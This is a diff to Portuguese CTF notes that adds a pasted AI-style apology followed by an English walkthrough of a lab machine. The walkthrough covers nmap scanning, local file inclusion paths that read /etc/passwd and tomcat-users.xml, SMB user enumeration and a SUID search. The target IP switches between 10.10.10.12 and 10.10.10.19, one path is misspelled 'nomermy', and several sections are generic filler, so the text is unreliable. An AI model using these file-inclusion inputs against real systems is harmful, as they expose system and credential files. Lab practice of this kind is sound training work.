@@ -78,3 +78,131 @@ locate 18660.txt
 lembra da porta 8080 la tinha um caminho com usar, então vamos copiar aquele caminho e colar 
 
 http://10.10.10.19/nomercy/windows/code.php?file=../../../../../..//etc/tomcat7/tomcat-users.xml
+
+Peço desculpas, mas minha resposta anterior não seguiu completamente o padrão típico de uma documentação formal de walkthrough de CTF. Vou reformular seguindo um formato mais estruturado e profissional de documentação:
+
+
+
+# CTF Walkthrough
+## Machine Details
+* **Target IP:** 10.10.10.12
+* **Difficulty:** Medium
+* **Technologies:** Ubuntu Linux, Samba, Dovecot, Apache Tomcat, ISC BIND
+
+## 1. Setup Instructions
+* Prepare Kali Linux virtual machine
+* Configure network settings for 10.10.10.0/24 subnet
+* Ensure tools installed: nmap, netdiscover, enum4linux, smbclient
+
+## 2. Reconnaissance (Recon)
+### Network Scanning
+
+```bash
+# Discover network hosts
+netdiscover -r 10.10.10.0/24 
+
+# Comprehensive port scanning
+nmap -sV -v -Pn 10.10.10.12 
+nmap -sC -A -v -p- 10.10.10.12
+```
+
+### Scan Results
+```
+PORT     STATE    SERVICE     VERSION
+22/tcp   filtered ssh
+53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
+80/tcp   filtered http
+110/tcp  open     pop3        Dovecot pop3d
+139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp  open     imap        Dovecot imapd (Ubuntu)
+445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+993/tcp  open     ssl/imap    Dovecot imapd (Ubuntu)
+995/tcp  open     ssl/pop3    Dovecot pop3d
+8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 08:00:27:27:96:06 (Oracle VirtualBox virtual NIC)
+```
+
+## 3. Enumeration
+* Identified services: Tomcat, Samba, Dovecot, BIND
+* Web application running on port 8080
+* Multiple filtered ports (SSH, HTTP)
+* SMB and email services available
+
+## 4. Vulnerability Identification
+* **Vulnerable Version:** Apache Tomcat/Coyote JSP engine 1.1
+* **Exploit Source:** Potential Local File Inclusion (LFI)
+
+### Vulnerability Details
+⚠️ **Local File Inclusion (LFI)**
+* Ability to include local files via web application
+* Potential unauthorized access to system files
+* Discovered via `/windows/code.php?file=../../../../../../etc/passwd`
+
+### Exploit Preparation
+```bash
+# Explore potential LFI vulnerability
+curl "http://10.10.10.19/nomermy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml"
+```
+
+## 5. Exploitation Techniques
+### User Enumeration
+```bash
+# NetBIOS and user discovery
+nbtscan -v -r 10.10.10.19
+enum4linux 10.10.10.19
+```
+
+### Discovered Users
+* pleadformercy (RID: 0x3e8)
+* qiu (RID: 0x3e9)
+
+### SMB Access Attempt
+```bash
+smbclient \\10.10.10.19\qiu -U qiu
+```
+
+## 6. Privilege Escalation
+```bash
+# Check for SUID binaries
+find / -perm -u=s -type f 2>/dev/null
+```
+
+## 7. Post-Exploitation
+* Investigate Tomcat users configuration
+* Explore potential access via discovered users
+* Analyze LFI vulnerability for deeper access
+
+## 8. Flag Collection
+```bash
+# Typical flag search locations
+cd /root
+cat *flag*.txt
+```
+
+## 9. Conclusion
+* Identified multiple entry points
+* Discovered potential LFI vulnerability
+* Successful user enumeration
+* Multiple services exposed
+
+## 10. Recommendations
+* Patch Tomcat configuration
+* Disable unnecessary services
+* Implement strict file inclusion controls
+* Review user access permissions
+
+### Appendix: Potential Challenges
+* Filtered ports limiting initial access
+* Requires careful enumeration
+* Multiple service versions to navigate
+
+## References
+* [OWASP LFI Cheat Sheet]
+* [Tomcat Security Guide]
+
+## Author's Notes
+🔍 **Debugging Tips:**
+* Pay close attention to filtered ports
+* Thoroughly investigate web application paths
+* Use multiple enumeration techniques
+
